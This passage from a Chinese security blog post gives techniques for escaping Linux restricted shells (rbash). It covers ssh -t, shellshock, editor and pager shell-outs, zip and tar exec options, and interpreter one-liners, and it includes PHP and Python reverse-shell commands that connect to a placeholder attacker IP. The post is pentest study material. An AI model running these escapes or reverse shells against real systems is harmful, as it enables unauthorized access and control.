+<h3 id="7-2-2-ssh登录时逃逸">7.2.2 ssh登录时逃逸</h3>
+<p>（借助-t远程在远程机器上运行脚本）</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP -t <span class="hljs-string">"/bin/sh"</span> or <span class="hljs-string">"/bin/bash"</span><br>ssh username@IP -t <span class="hljs-string">"bash --noprofile"</span><br>ssh username@IP -t <span class="hljs-string">"() { :; }; /bin/bash"</span>   <span class="hljs-comment">###shellshock</span><br></code></pre></td></tr></tbody></table></figure>
+<h3 id="7-2-3-当前shell中逃逸">7.2.3 当前shell中逃逸</h3>
+<h4 id="7-2-3-1-特殊情况">7.2.3.1 特殊情况</h4>
+<p>[1] / 被允许的情况下；直接 /bin/sh 或 /bin/bash</p>
+<p>[2]能够设置PATH或SHELL时</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">export PATH=$PATH:/bin/:/usr/bin:$PATH<br>export SHELL=/bin/sh<br></code></pre></td></tr></tbody></table></figure>
+<p>[3]权限足够时</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cp /bin/sh /path/ ;sh<br>或<br>cp /bin/bash /path/ ;sh<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="7-2-4-利用系统常见应用逃逸">7.2.4 利用系统常见应用逃逸</h3>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[1]ftp<br>[2]more<br>[3]less<br>[4]man<br>[5]vi<br>[6]vim<br>以上在输入的地方输入!/bin/sh 或 !/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214155912.png" alt="image-20230927214155912"></p>
+<h3 id="7-2-5-利用用户安装应用逃逸">7.2.5 利用用户安装应用逃逸</h3>
+<h4 id="1、ed-editor">1、ed-editor</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ed<br>!'/bin/sh'<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="2、git">2、git</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git help status <br>!/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="3、zip">3、zip</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="4、tar">4、tar</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tar cf /dev/null filename --checkpoint=1 --checkpoint-action=exec=/bin/bash<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214312060.png" alt="image-20230927214312060"></p>
+<h3 id="7-2-6-利用编程语言环境绕过">7.2.6 利用编程语言环境绕过</h3>
+<h4 id="1、python">1、python</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python -c 'import os; os.system("/bin/sh")'<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214351901.png" alt="image-20230927214351901"></p>
+<p>这里也是解密了，原来是在真实情况下才可以。。。</p>
+<h4 id="2、php">2、php</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">php -a then exec("sh -i");<br></code></pre></td></tr></tbody></table></figure>
+<p>这里仍未复现成功，它提示我语法错误？？？不理解</p>
+<p>使用PHP反弹设shell绕过</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">攻击机开启监听``nc -lvp PORT``目标机建立连接``php -r <span class="hljs-string">'$sock=fsockopen("IP",PORT);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></code></pre></td></tr></tbody></table></figure>
+<h4 id="3、perl">3、perl</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">perl -e 'exec "/bin/sh";'<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214552077.png" alt="image-20230927214552077"></p>
+<h4 id="4、lua">4、lua</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">os.execute('/bin/sh')<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214652108.png" alt="image-20230927214652108"></p>
+<p>同PHP。。。估计真是语法问题？</p>
+<h4 id="5、ruby">5、ruby</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exec "/bin/sh"<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214724097.png" alt="image-20230927214724097"></p>
+<h4 id="6、expect">6、expect</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">spwan sh<br>sh<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230927214742434.png" alt="image-20230927214742434"></p>
+<h1>0x08 tips:</h1>
+<p>8.1 比rbash更容易遇到的问题是当前路径异常问题</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>  <span class="hljs-comment">###一般很多命令基础执行不了的时候，都是路径异常，查看该值可验证    </span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin   <span class="hljs-comment">####修复</span><br></code></pre></td></tr></tbody></table></figure>
+<p>8.2 不能使用 &gt; ，&gt;&gt;等字符重定向写文件：echo ‘script code’ | tee scriptfile</p>
+<p>8.3 su切换用户逃逸时还可以在切换用户时执行spawn shell命令</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su -c <span class="hljs-string">"python -c  'import pty;pty.spawn(\"/bin/bash\")'"</span> test1<br></code></pre></td></tr></tbody></table></figure>
+<p>8.4 ssh 登录时同样可以通过spawn shell逃逸</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IP  <span class="hljs-string">"export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'</span><br></code></pre></td></tr></tbody></table></figure>
+<p>8.5 编程语言绕过的利用，还可以使用反弹shell到我们攻击机的方式进行逃逸，以python为例：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">'import       socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LISTENING IP",LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></code></pre></td></tr></tbody></table></figure>
+<p>8.6 上边用的比较多的是 !/bin/sh 和 !/bin/bash;其实还有一个 !‘sh’ —&gt;由于没有了 ‘/’ ；有时候能够达到很好的绕过效果</p>
+<p><img src="image-20230927215051670.png" alt="image-20230927215051670"></p>
+<p>8.7 同理在路径正确的情况下，在当前rbash中直接输入 sh 也能够完成逃逸( !/bin/sh 和 !/bin/bash 逃逸失败报错同[6] )</p>
+<p><img src="image-20230927215130750.png" alt="image-20230927215130750"></p>
+<h1>0x09 总结</h1>
+<p>这次也就是简单的演示了一下各种情况，毕竟环境配置也很难很烦，因此就草草了事，只需要记得有这些姿势即可，在实战时遇到问题在对应解决。</p>
+<p>上述这些逃逸方式应用到其他类型的restricted shell中也是可以的，由于不同系统特性不同，逃逸的方式也有很大差异；再就是用户限制的宽松程度不同，我们能够逃逸的方式也不同；用户安装的git、tar、zip等应用也能够给予很大的帮助；总之就是要多尝试，灵活应用！！！</p>
+<h1>0x10 参考文章</h1>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25924971/article/details/128884687">【安全】Linux Restricted Shell 绕过指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kuaile1314/p/12246116.html">[渗透技巧——如何逃逸Linux的受限制shell执行任意命令 ]</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">【渗透测试】— rbash逃逸方法简述</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7642">rbash逃逸大全</a></p>
+<p><a target="_blank" rel="noopener" href="https://posts.careerengine.us/p/623c361911387a6b1ddc861f">Restricted Bash绕过技巧</a>  --建立rbash环境可参考</p>
+<p><a target="_blank" rel="noopener" href="https://xie.infoq.cn/article/79f9d1ae819819834577891fd">DC 系列靶机知识点总结</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://hybcx.xyz/2023/09/27/linux-ti-quan-xue-xi-yi/">http://hybcx.xyz/2023/09/27/linux-ti-quan-xue-xi-yi/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">hybcx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Linux%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">Linux提权</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/10/01/ti-mu-ming-cheng-ssrf-me/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="题目名称-SSRF Me">
+                        
+                        <span class="card-title">题目名称-SSRF Me</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-10-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="post-category">
+                                    攻防世界
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/09/25/windows-ti-quan-xue-xi-er/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="权限提升学习">
+                        
+                        <span class="card-title">权限提升学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/">
+                        <span class="chip bg-color">数据库提权系列</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2024</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hybcx</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
